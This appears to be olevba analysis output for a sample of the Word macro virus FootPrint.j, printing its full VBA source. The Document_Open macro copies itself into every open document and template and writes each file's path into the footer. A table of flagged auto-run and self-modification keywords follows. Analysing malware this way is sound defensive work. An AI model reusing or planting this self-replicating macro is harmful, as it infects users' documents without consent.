olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.FootPrint.j-d8fa90c5279ac15e443bd7713b8d212da0784baa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.FootPrint.j-d8fa90c5279ac15e443bd7713b8d212da0784baa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Private Sub Document_Open()
On Error Resume Next
Dim al As String
Dim adoc As Document
Dim atpl As Template
ThisDocument.VBProject.VBComponents("ThisDocument").Export "c:\footprint.$$$"
Open "c:\footprint.$$$" For Input As #1
Open "c:\footprint.$$1" For Output As #2
Line Input #1, al
Line Input #1, al
Line Input #1, al
Line Input #1, al
While Not EOF(1)
    Line Input #1, al
    Print #2, al
Wend
Close 1
Close 2
For Each adoc In Documents
    If Not adoc.CustomDocumentProperties("FootPrint") Then
        adoc.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = adoc.FullName
        adoc.CustomDocumentProperties.Add Name:="FootPrint", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        adoc.VBProject.VBComponents("ThisDocument").codemodule.AddFromFile "c:\footprint.$$1"
    End If
Next
For Each atpl In Templates
    If Not atpl.CustomDocumentProperties("FootPrint") Then
        atpl.CustomDocumentProperties.Add Name:="FootPrint", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        atpl.VBProject.VBComponents("ThisDocument").codemodule.AddFromFile "c:\footprint.$$1"
    End If
Next
End Sub


Private Sub Document_Close()
On Error GoTo Close_error
    If ActiveDocument.Variables(strPOST_WIZ_BLN).Value = "1" Then
        If fPostWizBlnOpen Then
            objPostWizBln.Close
            fPostWizBlnOpen = False
        End If
    End If
    
Close_error:
    Err.Clear
End Sub
Private Sub Document_New()
    Common.StartWizard
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
+----------+--------------------+---------------------------------------------+

